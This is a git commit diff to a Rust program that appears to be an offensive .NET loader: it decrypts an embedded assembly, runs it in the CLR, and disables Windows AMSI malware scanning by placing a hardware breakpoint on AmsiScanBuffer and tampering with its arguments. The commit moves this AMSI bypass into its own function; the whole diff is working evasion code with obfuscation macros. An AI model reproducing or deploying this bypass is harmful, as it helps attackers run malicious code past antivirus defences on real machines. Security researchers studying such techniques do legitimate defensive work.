8927a3924c6e138f06f06e6bbe1c55cfeb7c102f
Kicked Droid <24928676+KickedDroid@users.noreply.github.com>
2025-06-26 11:21:53 -0500

    Update main.rs

--- src/main.rs
+++ src/main.rs
@@ -1,13 +1,15 @@
+use std::error::{self, Error};
+
 use clroxide::clr::Clr;
 use crypto::symmetriccipher::SynchronousStreamCipher;
-use dinvk::{GetModuleHandle,GetProcAddress};
-use hwbp::{Size, Condition, Context};
+use dinvk::{GetModuleHandle, GetProcAddress};
 use hwbp::windows::CONTEXT;
+use hwbp::{Condition, Context, ContextError, Size, HWBP};
 use libloading::Library;
 use zeroize::Zeroize;
 
 fn hooked_method(ctx: &mut CONTEXT) {
-    println!("[+] Breakpoint has been triggered\n[+] Hooking AmsiScanBuffer");
+    println!("[+] Breakpoint has been triggered\n");
     ctx.Rcx += 27;
 }
 
@@ -30,43 +32,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     cryptify::flow_stmt!();
     let mut clr = Clr::new(o.to_vec(), args)?;
 
-    /////////////////////////////////////////////////////////////
-    // AMSI Bypass
-    /////////////////////////////////////////////////////////////
     // Step 1. Load amsi.dll into the process
     let lib = unsafe { Library::new("C:\\Windows\\System32\\amsi.dll").expect("Shit") };
-
-    // Step 2. Get the address of the `AmsiScanbuffer`
-    let amsi_dll = GetModuleHandle("amsi.dll", None);
-    let addr = GetProcAddress(amsi_dll, "AmsiScanBuffer", None);
-    println!(
-        "[!] Found AMSI.DLL: {:?} \n[!] AmsiScanBuffer address: {:?}",
-        amsi_dll, addr 
-    );
-
     let mut ctx = Context::current().unwrap();
-    let mut hwbp = ctx
-        .unused()
-        .unwrap()
-        .watch_memory_execute(addr as _, hooked_method)
-        .with_enabled(true)
-        .with_condition(Condition::Execute)
-        .with_size(Size::FourBytes)
-        .with_callback(hooked_method)
-        .build_and_set()
-        .unwrap();
-
-    match ctx.apply_for_current_thread() {
-        Ok(_) => println!("[+] Hardware Breakpoint has been applied"),
-        Err(e) => {
-            eprintln!("[x] Failed with error: {e}");
-            return Ok(());
-        },
-    }
+    let mut hwbp = amsi_bypass(ctx)?;
 
     // Run the dotnet exe
-    let results = clr.run()?;
-    println!("[*] Results:\n\n{}", results);
+    let results = clr.run();
+    match results {
+        Ok(res) => println!("[*] Results:\n\n{}", res),
+        Err(e) => return Err(e.into())
+    }
+    
     // Zero Buffer
     o.zeroize();
 
@@ -79,4 +56,41 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
     // Cleanup
     let _ = lib.close();
     Ok(())
+}
+
+
+
+
+fn amsi_bypass(mut ctx: hwbp::Context) -> Result<(HWBP), ContextError> {
+    /////////////////////////////////////////////////////////////
+    // AMSI Bypass
+    /////////////////////////////////////////////////////////////
+
+    // Step 2. Get the address of the `AmsiScanbuffer`
+    let amsi_dll = GetModuleHandle("amsi.dll", None);
+    let addr = GetProcAddress(amsi_dll, "AmsiScanBuffer", None);
+    println!(
+        "[!] Found AMSI.DLL: {:?} \n[!] AmsiScanBuffer address: {:?}",
+        amsi_dll, addr
+    );
+
+    let mut hwbp = ctx
+        .unused()
+        .unwrap()
+        .watch_memory_execute(addr as _, hooked_method)
+        .with_enabled(true)
+        .with_condition(Condition::Execute)
+        .build_and_set()
+        .expect("Failed");
+
+    match ctx.apply_for_current_thread() {
+        Ok(_) => {
+            println!("[+] Hardware Breakpoint has been applied");
+            Ok(hwbp)
+        }
+        Err(e) => {
+            eprintln!("[x] Failed with error: {e}");
+            Err(e)
+        }
+    }
 }
